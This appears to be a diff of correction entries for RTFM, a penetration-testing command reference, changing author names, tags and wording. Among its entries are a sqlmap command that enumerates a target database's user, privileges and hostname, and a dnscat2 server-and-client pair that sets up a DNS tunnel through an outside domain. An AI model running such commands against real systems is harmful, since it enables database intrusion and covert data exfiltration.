@@ -1,0 +1,34 @@
+tblcommand
+cmd
+EOA
+rtfm.py -c [command] -t [tag1],[tag2] -R [comment] -r [reference] -a [Author] -A [Date|Now]  -p P
+cmd
+rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
+author
+Innes
+EOU
+tblcommand
+cmd
+EOA
+/opt/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o -r sql1.txt
+cmd
+/data/hacking/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o
+author
+@yght
+EOU
+tbltagcontent
+tag
+EOA
+encryption
+tag
+encyption
+EOU
+tblcommand
+cmnt
+EOA
+DNS tunnel, first cmd is server, second client.
+cmnt
+DNS tunnel, , first cmd is server, second client
+cmd
+ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com
+EOU
